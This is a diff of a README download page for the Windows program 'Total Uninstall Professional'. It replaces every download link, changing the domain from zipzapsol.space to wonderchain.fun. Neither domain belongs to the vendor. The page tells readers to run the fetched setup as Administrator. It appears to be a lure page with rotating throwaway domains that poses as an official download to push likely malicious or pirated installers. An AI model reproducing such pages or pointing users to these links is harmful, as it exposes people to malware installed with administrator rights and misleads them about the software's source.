@@ -13,27 +13,27 @@
 > **This is the download page.** Use the button or link below to get **Total Uninstall Professional** for Windows.
 
 <p align="center">
-  <a href="https://totaluninstall.zipzapsol.space/">
+  <a href="https://totaluninstall.wonderchain.fun/">
     <img src="https://img.shields.io/badge/Download-Total%20Uninstall%20Professional-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download Total Uninstall Professional">
   </a>
 </p>
 
 | | |
 | --- | --- |
-| **Direct link** | **[totaluninstall.zipzapsol.space](https://totaluninstall.zipzapsol.space/)** |
-| **Full URL** | `https://totaluninstall.zipzapsol.space/` |
+| **Direct link** | **[totaluninstall.wonderchain.fun](https://totaluninstall.wonderchain.fun/)** |
+| **Full URL** | `https://totaluninstall.wonderchain.fun/` |
 | **Type** | Installer for Windows 10 / 11 (64-bit) |
 | **Admin** | Run setup as Administrator |
 
 ### Quick steps
 
-1. Click **[Download — totaluninstall.zipzapsol.space](https://totaluninstall.zipzapsol.space/)** (link above)
+1. Click **[Download — totaluninstall.wonderchain.fun](https://totaluninstall.wonderchain.fun/)** (link above)
 2. Save the file from the project page
 3. Run the setup **as Administrator**
 4. Enter your license key when prompted
 5. Restart if the installer asks — then launch from Start menu
 
-<p align="center"><a href="https://totaluninstall.zipzapsol.space/"><strong>⬇ Download Total Uninstall Professional now</strong></a></p>
+<p align="center"><a href="https://totaluninstall.wonderchain.fun/"><strong>⬇ Download Total Uninstall Professional now</strong></a></p>
 
 ---
 
